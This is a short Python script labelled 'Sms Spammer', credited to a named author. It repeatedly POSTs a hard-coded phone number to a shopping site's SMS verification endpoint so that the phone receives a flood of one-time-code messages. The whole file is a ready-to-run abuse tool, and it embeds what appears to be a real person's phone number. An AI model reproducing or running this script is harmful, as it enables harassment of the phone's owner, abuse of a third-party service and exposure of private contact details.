#!/usr/bin/python
#-*-coding:utf-8-*-
# Sms Spammer
# Coded By Deray
# Github : https://github.com/LOoLzeC
# Instagram : reyy05_
####################
import requests,sys
def spammer():
	lo=50#sys.argv[1]
	li=int(lo)
	phone='082243309590'#sys.argv[2]
	parameter = {'phone':phone,'smsType':'1'}
	count=0
	while (li > count):
		r = requests.post('http://sc.jd.id/phone/sendPhoneSms', data=parameter)
		if '"success":true' in r.text:
			print "[%s] send succesful"%count
		else:
			print "[%s] send failed"%count
		count=count+1
if __name__ == "__main__":
	#if len(sys.argv) != 3:
	#	print "[-] Ussage python "+sys.argv[0]+" count phone"
	#	print "[+] Example : python "+sys.argv[0]+" 2 0895xxxx"
	#	sys.exit()
	#else:
	spammer()
